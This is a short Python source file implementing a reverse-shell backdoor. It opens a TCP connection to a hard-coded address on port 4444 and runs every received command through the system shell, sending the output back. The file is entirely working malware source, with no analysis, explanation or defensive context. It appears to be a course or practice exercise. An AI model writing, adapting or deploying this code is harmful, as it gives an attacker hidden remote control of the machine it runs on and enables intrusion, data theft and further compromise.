import socket
import subprocess
import json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        while True:
            try:
                json_data = self.connection.recv(2048)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self,command):
        return subprocess.check_output(command,shell=True)

    def run(self):
        while True:
            command = self.connection.recv(2048)
            command_result = self.execute_system_command(command.decode())
            self.connection.send(command_result)
        self.connection.close()

my_backdoor = Backdoor("192.168.1.0",4444)
my_backdoor.run()                
